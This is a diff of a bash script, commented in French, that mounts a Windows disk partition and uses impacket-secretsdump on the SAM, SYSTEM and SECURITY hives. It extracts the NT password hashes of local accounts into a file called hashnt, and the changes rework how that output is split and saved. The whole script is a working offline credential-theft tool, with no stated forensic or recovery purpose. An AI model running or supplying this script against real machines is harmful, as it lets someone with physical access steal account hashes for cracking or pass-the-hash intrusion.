@@ -1,3 +1,5 @@
+#!/bin/bash
+
 configPath="Windows/System32/config"
 if [ -z "$1" ]; then
   part="sda3"
@@ -15,18 +17,15 @@ sudo umount /dev/$part
 sudo rmdir /mnt/$part
 # sudo apt-get install impacket-secretsdump -y > /dev/null
 hashs="$(sudo impacket-secretsdump -sam ./win/SAM -system ./win/SYSTEM -security ./win/SECURITY LOCAL | grep :::)"
-echo "${hashs// ::: /$'\n'/}"
-
-hashs=${hashs// ::: /$'\n'/}
-echo $hashs
+hashs="${hashs// ::: /$'\n'}"
 
 # Remplacer ':' par un espace
 hashs="${hashs//:/ }"
 
-# Parcourir les éléments séparés par des espaces et les afficher
-for i in $hashs; do
-  echo "$i"
-  echo -e $i >> ./win/hashnt
-done
+# Utiliser la commande "read" pour parcourir les lignes de la variable
+while IFS= read -r line; do
+  echo "$line"
+  echo "$line" >> ./win/hashnt
+done <<< "$hashs"
 
 cat ./win/hashnt
